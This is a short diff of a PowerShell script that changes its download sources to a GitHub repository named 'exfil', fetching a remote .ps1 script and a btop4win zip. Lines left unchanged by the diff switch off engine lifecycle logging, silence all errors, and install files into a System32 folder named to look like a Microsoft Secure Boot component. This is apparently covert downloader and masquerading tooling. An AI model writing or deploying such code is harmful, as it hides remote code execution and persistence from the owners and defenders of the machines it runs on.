@@ -9,8 +9,8 @@ $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
 $currentPath = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
 $ErrorActionPreference = 'SilentlyContinue'
-$cleaupurl = "https://codeberg.org/sempiampi/mavericks/src/branch/main/Sanitation/TerminalTaskManagerPurge.ps1"
-$btop4winurl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/btop4win.zip"
+$cleaupurl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Miscellaneous/TerminalTaskManager.ps1"
+$btop4winurl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/btop4win.zip"
 $zippath = "$env:TEMP\botop4win.zip"
 $basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
 $btop4winpath = Join-Path -Path $basepath -ChildPath "btop4win"
